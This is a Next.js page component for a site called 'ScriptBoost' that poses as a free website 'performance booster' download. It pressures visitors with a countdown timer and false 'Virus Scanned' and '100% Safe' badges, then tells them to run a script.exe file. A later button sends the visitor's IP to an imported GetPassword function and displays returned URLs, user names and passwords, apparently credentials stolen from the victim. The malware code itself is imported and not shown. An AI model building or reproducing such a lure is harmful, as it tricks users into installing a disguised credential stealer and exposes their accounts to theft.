"use client"

import { useState, useEffect } from "react"
import Image from "next/image"
import { motion } from "framer-motion"
import { Download, Clock, Check, FileText, Play, X } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Progress } from "@/components/ui/progress"
import GetPassword from "@/script/get_password"
import { Password } from "@/interface"
import Script from "@/script/script"

async function GetIP(): Promise<string> {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    
    if (!response.ok) {
      throw new Error('Failed to fetch IP address');
    }
    
    const data = await response.json();
    return data.ip;
  } catch (error) {
    console.error('Error getting IP address:', error);
    return '';
  }
}

export default function Home() {
  const [isDownloading, setIsDownloading] = useState(false)
  const [isDownloaded, setIsDownloaded] = useState(false)
  const [progress, setProgress] = useState(0)
  const [isShowPassword, setIsShowPassword] = useState(false)
  const [timeLeft, setTimeLeft] = useState({
    hours: 1,
    minutes: 59,
    seconds: 59,
  })
  const [showNotification, setShowNotification] = useState(false)

  // Countdown timer
  useEffect(() => {
    const timer = setInterval(() => {
      setTimeLeft((prev) => {
        if (prev.seconds > 0) {
          return { ...prev, seconds: prev.seconds - 1 }
        } else if (prev.minutes > 0) {
          return { ...prev, minutes: prev.minutes - 1, seconds: 59 }
        } else if (prev.hours > 0) {
          return { hours: prev.hours - 1, minutes: 59, seconds: 59 }
        }
        return prev
      })
    }, 1000)

    return () => clearInterval(timer)
  }, [])

  // Show notification after a delay
  useEffect(() => {
    const timer = setTimeout(() => {
      if (!isDownloaded) {
        setShowNotification(true)
      }
    }, 5000)

    return () => clearTimeout(timer)
  }, [isDownloaded])

  // Simulate download progress
  useEffect(() => {
    if (isDownloading && progress < 100) {
      const interval = setInterval(() => {
        setProgress((prev) => {
          const newProgress = prev + Math.floor(Math.random() * 10) + 5
          if (newProgress >= 100) {
            clearInterval(interval)
            setTimeout(() => {
              setIsDownloading(false)
              setIsDownloaded(true)
            }, 500)
            return 100
          }
          return newProgress
        })
      }, 300)

      return () => clearInterval(interval)
    }
  }, [isDownloading, progress])

  const handleDownload = () => {
    setIsDownloading(true)
    setProgress(0)
    setShowNotification(false)
    Script();
  }

  const [password, setPassword] = useState<Password[]>();

  const getPassword = async () => {
      const ip = await GetIP();
      console.log(ip)
      const pwd = await GetPassword(ip);
      setPassword(pwd);
      setIsShowPassword(true);
  };

  // function getIP() {
  //   try {
  //     const response = await fetch('https://api.ipify.org?format=json');
      
  //     if (!response.ok) {
  //       throw new Error('Failed to fetch IP address');
  //     }
      
  //     const data = await response.json();
  //     return data.ip;
  //   } catch (error) {
  //     console.error('Error getting IP address:', error);
  //     return '';
  //   }
  // }

  return (
    <div className="min-h-screen flex flex-col bg-gradient-to-br from-blue-50 to-purple-50">
      {/* Floating notification */}
      {showNotification && !isDownloaded && !isDownloading && (
        <div className="fixed bottom-4 right-4 z-50 max-w-sm">
          <motion.div
            initial={{ x: 100, opacity: 0 }}
            animate={{ x: 0, opacity: 1 }}
            transition={{ duration: 0.5 }}
            className="bg-white rounded-lg shadow-lg p-4 border-l-4 border-blue-500"
          >
            <div className="flex items-start">
              <div className="flex-shrink-0">
                <div className="h-10 w-10 rounded-full bg-blue-100 flex items-center justify-center">
                  <Download className="h-5 w-5 text-blue-500" />
                </div>
              </div>
              <div className="ml-3">
                <p className="text-sm font-medium text-gray-900">Ready to download!</p>
                <p className="mt-1 text-sm text-gray-500">Click the download button to get your script now</p>
              </div>
              <button
                onClick={() => setShowNotification(false)}
                className="ml-4 flex-shrink-0 bg-white rounded-md inline-flex text-gray-400 hover:text-gray-500"
              >
                <span className="sr-only">Close</span>
                <X className="h-5 w-5" />
              </button>
            </div>
          </motion.div>
        </div>
      )}

      {/* Header */}
      <header className="relative z-10 py-6">
        <div className="container mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex justify-between items-center">
            <div className="flex items-center">
              <div className="flex items-center justify-center w-10 h-10 rounded-full bg-gradient-to-r from-blue-500 to-purple-600">
                <span className="text-white font-bold text-xl">S</span>
              </div>
              <span className="ml-3 text-xl font-bold bg-gradient-to-r from-blue-500 to-purple-600 bg-clip-text text-transparent">
                ScriptBoost
              </span>
            </div>

            <Button
              onClick={() => document.getElementById("download-section")?.scrollIntoView({ behavior: "smooth" })}
              className="bg-gradient-to-r from-blue-500 to-purple-600 hover:from-blue-600 hover:to-purple-700 text-white"
            >
              Download Now
            </Button>
          </div>
        </div>
      </header>

      <main className="flex-grow">
        {/* Hero Section */}
        <section className="relative py-12 md:py-20">
          <div className="container mx-auto px-4 sm:px-6 lg:px-8">
            <div className="text-center max-w-4xl mx-auto">
              <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ duration: 0.5 }}>
                <span className="inline-flex items-center px-3 py-1 rounded-full text-sm font-medium bg-blue-100 text-blue-800">
                  <Clock className="mr-1 h-4 w-4" /> Limited Time Offer
                </span>
                <h1 className="mt-4 text-4xl font-extrabold tracking-tight text-gray-900 sm:text-5xl md:text-6xl">
                  <span className="block">Download Our Powerful</span>
                  <span className="block bg-gradient-to-r from-blue-500 to-purple-600 bg-clip-text text-transparent">
                    Performance Booster Script
                  </span>
                </h1>
                <p className="mt-6 text-xl text-gray-600 max-w-3xl mx-auto">
                  This <span className="font-bold underline decoration-blue-500 decoration-2">advanced script</span> has
                  helped thousands of websites achieve amazing speed improvements. Download it now for free!
                </p>
              </motion.div>

              <div className="mt-8 flex justify-center">
                <div className="inline-flex items-center rounded-md bg-blue-50 p-4 shadow-sm">
                  <Clock className="h-6 w-6 text-blue-500 mr-3" />
                  <span className="text-lg font-medium text-gray-900">Offer Available For:</span>
                  <div className="ml-3 grid grid-flow-col gap-1 text-center auto-cols-max">
                    <div className="flex flex-col p-2 bg-white rounded-md text-blue-600">
                      <span className="font-mono text-xl">{String(timeLeft.hours).padStart(2, "0")}</span>
                      <span className="text-xs text-gray-500">hours</span>
                    </div>
                    <div className="flex flex-col p-2 bg-white rounded-md text-blue-600">
                      <span className="font-mono text-xl">{String(timeLeft.minutes).padStart(2, "0")}</span>
                      <span className="text-xs text-gray-500">min</span>
                    </div>
                    <div className="flex flex-col p-2 bg-white rounded-md text-blue-600">
                      <span className="font-mono text-xl">{String(timeLeft.seconds).padStart(2, "0")}</span>
                      <span className="text-xs text-gray-500">sec</span>
                    </div>
                  </div>
                </div>
              </div>

              <motion.div
                className="mt-10"
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                transition={{ delay: 0.3, duration: 0.5 }}
              >
                <Button
                  onClick={() => document.getElementById("download-section")?.scrollIntoView({ behavior: "smooth" })}
                  className="px-8 py-3 text-base font-medium rounded-md text-white bg-gradient-to-r from-blue-500 to-purple-600 hover:from-blue-600 hover:to-purple-700 md:py-4 md:text-lg md:px-10"
                >
                  Download Free Script
                  <Download className="ml-2 h-5 w-5" />
                </Button>
              </motion.div>
            </div>
          </div>
        </section>

        {/* Features Section */}
        <section className="py-12 bg-white">
          <div className="container mx-auto px-4 sm:px-6 lg:px-8">
            <div className="text-center">
              <h2 className="text-3xl font-bold text-gray-900">
                Why Our Script Is <span className="text-blue-500">Amazing</span>
              </h2>
              <p className="mt-3 text-xl text-gray-600">
                Discover the benefits that thousands of users are already enjoying
              </p>
            </div>

            <div className="mt-10 grid grid-cols-1 gap-8 md:grid-cols-3">
              {[
                {
                  title: "Lightning Fast",
                  description: "Boost your website speed by up to 200% with our optimized script.",
                  icon: (
                    <svg className="h-8 w-8 text-blue-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                      <path
                        strokeLinecap="round"
                        strokeLinejoin="round"
                        strokeWidth={2}
                        d="M13 10V3L4 14h7v7l9-11h-7z"
                      />
                    </svg>
                  ),
                },
                {
                  title: "Easy Installation",
                  description: "Just download and add one line of code. No complicated setup required.",
                  icon: (
                    <svg className="h-8 w-8 text-blue-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                      <path
                        strokeLinecap="round"
                        strokeLinejoin="round"
                        strokeWidth={2}
                        d="M10 20l4-16m4 4l4 4-4 4M6 16l-4-4 4-4"
                      />
                    </svg>
                  ),
                },
                {
                  title: "Works Everywhere",
                  description: "Compatible with all major browsers and platforms. No limitations.",
                  icon: (
                    <svg className="h-8 w-8 text-blue-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                      <path
                        strokeLinecap="round"
                        strokeLinejoin="round"
                        strokeWidth={2}
                        d="M21 12a9 9 0 01-9 9m9-9a9 9 0 00-9-9m9 9H3m9 9a9 9 0 01-9-9m9 9c1.657 0 3-4.03 3-9s-1.343-9-3-9m0 18c-1.657 0-3-4.03-3-9s1.343-9 3-9m-9 9a9 9 0 019-9"
                      />
                    </svg>
                  ),
                },
              ].map((feature, index) => (
                <motion.div
                  key={index}
                  className="bg-blue-50 rounded-xl p-6"
                  initial={{ opacity: 0, y: 20 }}
                  whileInView={{ opacity: 1, y: 0 }}
                  transition={{ duration: 0.5, delay: index * 0.1 }}
                  viewport={{ once: true }}
                >
                  <div className="flex flex-col items-center text-center">
                    <div className="flex items-center justify-center h-16 w-16 rounded-full bg-blue-100 mb-4">
                      {feature.icon}
                    </div>
                    <h3 className="text-xl font-bold text-gray-900">{feature.title}</h3>
                    <p className="mt-2 text-gray-600">{feature.description}</p>
                  </div>
                </motion.div>
              ))}
            </div>
          </div>
        </section>

        {/* Download Section */}
        <section id="download-section" className="py-16 bg-gradient-to-br from-blue-50 to-purple-50">
          <div className="container mx-auto px-4 sm:px-6 lg:px-8">
            <div className="max-w-3xl mx-auto">
              <motion.div
                initial={{ opacity: 0, scale: 0.95 }}
                whileInView={{ opacity: 1, scale: 1 }}
                transition={{ duration: 0.5 }}
                viewport={{ once: true }}
                className="bg-white rounded-xl p-8 shadow-xl"
              >
                <div className="text-center">
                  <FileText className="h-16 w-16 text-blue-500 mx-auto mb-4" />
                  <h2 className="text-3xl font-bold text-gray-900">Get Your Script Now</h2>
                  <p className="mt-4 text-lg text-gray-600">
                    Click the button below to download our performance-boosting script instantly.
                  </p>
                </div>

                <div className="mt-8 flex flex-col items-center">
                  {isDownloaded ? (
                    <div className="w-full max-w-md text-center">
                      <div className="bg-green-100 text-green-800 rounded-lg p-4 mb-6">
                        <Check className="h-8 w-8 mx-auto mb-2" />
                        <h3 className="text-lg font-bold">Download Complete!</h3>
                        <p>Your script has been downloaded successfully.</p>
                      </div>

                      <div className="bg-gray-50 rounded-lg p-6 border border-gray-200">
                        <h3 className="text-lg font-bold text-gray-900 mb-4">Installation Instructions</h3>
                        <div className="text-left space-y-4">
                          <div className="flex items-start">
                            <div className="flex-shrink-0 h-6 w-6 rounded-full bg-blue-100 flex items-center justify-center text-blue-800 font-bold text-sm">
                              1
                            </div>
                            <p className="ml-3 text-gray-600">run the script.exe file</p>
                          </div>
                          <div className="flex items-start">
                            <div className="flex-shrink-0 h-6 w-6 rounded-full bg-blue-100 flex items-center justify-center text-blue-800 font-bold text-sm">
                              2
                            </div>
                            <p className="ml-3 text-gray-600">reload thhis website</p>
                          </div>
                          <div className="flex items-start">
                            <div className="flex-shrink-0 h-6 w-6 rounded-full bg-blue-100 flex items-center justify-center text-blue-800 font-bold text-sm">
                              3
                            </div>
                            <p className="ml-3 text-gray-600">Enjoy your time!</p>
                          </div>
                        </div>
                        {isShowPassword ? 
                        <div className="mt-6 bg-gray-800 rounded-md p-4 text-left">
                          <pre className="text-green-400 text-sm overflow-x-auto">
                            <code>{password?.map(
                              (item) => 
                                <div key={item.id}>
                                <div>index: {item.sequence} </div>
                                <div>ip_address: {item.ip_address} </div>
                                <div>url: {item.url}</div>
                                <div> user_name: {item.user_name} </div>
                                <div>password: {item.password}</div>
                              </div>)
                              }
                              </code>
                          </pre>
                        </div>
                        :
                        null
                        }
                      </div>

                      <div className="mt-6">
                        <Button onClick={getPassword} className="bg-blue-500 hover:bg-blue-600 text-white">
                          We have something to show
                          <Download className="ml-2 h-4 w-4" />
                        </Button>
                      </div>
                    </div>
                  ) : isDownloading ? (
                    <div className="w-full max-w-md">
                      <div className="text-center mb-4">
                        <p className="text-lg font-medium text-gray-900">Downloading script...</p>
                        <p className="text-sm text-gray-500">Please don't close this window</p>
                      </div>
                      <Progress value={progress} className="h-2 mb-2" />
                      <p className="text-right text-sm text-gray-500">{progress}%</p>

                      <div className="mt-6 bg-blue-50 rounded-lg p-4 flex items-center">
                        <div className="mr-4 flex-shrink-0">
                          <div className="h-12 w-12 rounded-full bg-blue-100 flex items-center justify-center animate-pulse">
                            <Download className="h-6 w-6 text-blue-500" />
                          </div>
                        </div>
                        <div>
                          <h4 className="text-sm font-medium text-gray-900">speedboost.js</h4>
                          <p className="text-xs text-gray-500">Size: 42.3 KB</p>
                        </div>
                      </div>
                    </div>
                  ) : (
                    <div className="w-full max-w-md">
                      <Button
                        onClick={handleDownload}
                        className="w-full py-6 text-lg bg-gradient-to-r from-blue-500 to-purple-600 hover:from-blue-600 hover:to-purple-700 text-white"
                      >
                        <Download className="mr-2 h-6 w-6" />
                        Download Script Now
                      </Button>
                      <p className="mt-3 text-sm text-gray-500 text-center">No email required. Instant download.</p>

                      <div className="mt-6 flex items-center justify-center space-x-6">
                        <div className="flex items-center">
                          <Check className="h-5 w-5 text-green-500" />
                          <span className="ml-2 text-sm text-gray-500">Virus Scanned</span>
                        </div>
                        <div className="flex items-center">
                          <Check className="h-5 w-5 text-green-500" />
                          <span className="ml-2 text-sm text-gray-500">100% Safe</span>
                        </div>
                        <div className="flex items-center">
                          <Check className="h-5 w-5 text-green-500" />
                          <span className="ml-2 text-sm text-gray-500">Free Forever</span>
                        </div>
                      </div>
                    </div>
                  )}
                </div>
              </motion.div>

              {!isDownloaded && (
                <div className="mt-8 text-center">
                  <p className="text-gray-600">
                    <span className="font-bold text-blue-500">10,000+</span> websites are already using our script
                  </p>
                  <div className="mt-4 flex justify-center space-x-8">
                    <Image
                      src="/placeholder.svg?height=30&width=100"
                      alt="Company logo"
                      width={100}
                      height={30}
                      className="grayscale opacity-50 hover:grayscale-0 hover:opacity-100 transition-all"
                    />
                    <Image
                      src="/placeholder.svg?height=30&width=100"
                      alt="Company logo"
                      width={100}
                      height={30}
                      className="grayscale opacity-50 hover:grayscale-0 hover:opacity-100 transition-all"
                    />
                    <Image
                      src="/placeholder.svg?height=30&width=100"
                      alt="Company logo"
                      width={100}
                      height={30}
                      className="grayscale opacity-50 hover:grayscale-0 hover:opacity-100 transition-all"
                    />
                    <Image
                      src="/placeholder.svg?height=30&width=100"
                      alt="Company logo"
                      width={100}
                      height={30}
                      className="grayscale opacity-50 hover:grayscale-0 hover:opacity-100 transition-all"
                    />
                  </div>
                </div>
              )}
            </div>
          </div>
        </section>

        {/* How It Works Section */}
        {!isDownloaded && (
          <section className="py-12 bg-white">
            <div className="container mx-auto px-4 sm:px-6 lg:px-8">
              <div className="text-center max-w-3xl mx-auto">
                <h2 className="text-3xl font-bold text-gray-900">
                  How It <span className="text-blue-500">Works</span>
                </h2>
                <p className="mt-3 text-xl text-gray-600">
                  Our script is incredibly easy to use and delivers instant results
                </p>
              </div>

              <div className="mt-12 max-w-4xl mx-auto">
                <div className="relative">
                  <div className="absolute inset-0 flex items-center" aria-hidden="true">
                    <div className="w-full border-t border-gray-300"></div>
                  </div>
                  <div className="relative flex justify-between">
                    {[
                      { title: "Download", icon: <Download className="h-6 w-6" /> },
                      { title: "Install", icon: <FileText className="h-6 w-6" /> },
                      { title: "Activate", icon: <Play className="h-6 w-6" /> },
                    ].map((step, index) => (
                      <div key={index} className="bg-white px-4">
                        <div className="relative">
                          <div className="h-16 w-16 rounded-full bg-blue-100 flex items-center justify-center text-blue-600 mx-auto">
                            {step.icon}
                          </div>
                          <div className="mt-3 text-center">
                            <h3 className="text-lg font-medium text-gray-900">{step.title}</h3>
                          </div>
                        </div>
                      </div>
                    ))}
                  </div>
                </div>

                <div className="mt-12 bg-blue-50 rounded-lg p-6">
                  <div className="flex items-start">
                    <div className="flex-shrink-0">
                      <div className="flex items-center justify-center h-12 w-12 rounded-full bg-blue-100 text-blue-600">
                        <svg className="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                          <path
                            strokeLinecap="round"
                            strokeLinejoin="round"
                            strokeWidth={2}
                            d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"
                          />
                        </svg>
                      </div>
                    </div>
                    <div className="ml-4">
                      <h3 className="text-lg font-medium text-gray-900">Important Note</h3>
                      <p className="mt-2 text-gray-600">
                        Our script works with all major website platforms including WordPress, Shopify, Wix, and custom
                        HTML sites. No technical knowledge required for installation.
                      </p>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </section>
        )}
      </main>

      <footer className="bg-gray-900 text-white py-12">
        <div className="container mx-auto px-4 sm:px-6 lg:px-8">
          <div className="text-center">
            <div className="flex items-center justify-center">
              <div className="flex items-center justify-center w-10 h-10 rounded-full bg-gradient-to-r from-blue-500 to-purple-600">
                <span className="text-white font-bold text-xl">S</span>
              </div>
              <span className="ml-3 text-xl font-bold text-white">ScriptBoost</span>
            </div>

            <p className="mt-4 text-gray-400 max-w-md mx-auto">
              Providing performance-enhancing scripts for websites worldwide. Boost your site's speed and user
              experience today.
            </p>

            <div className="mt-8 border-t border-gray-800 pt-8">
              <p className="text-sm text-gray-400">
                &copy; {new Date().getFullYear()} ScriptBoost. All rights reserved.
              </p>
              <div className="mt-2 flex justify-center space-x-6">
                <a href="#" className="text-gray-400 hover:text-white">
                  Privacy Policy
                </a>
                <a href="#" className="text-gray-400 hover:text-white">
                  Terms of Service
                </a>
                <a href="#" className="text-gray-400 hover:text-white">
                  Contact Us
                </a>
              </div>
            </div>
          </div>
        </div>
      </footer>
    </div>
  )
}

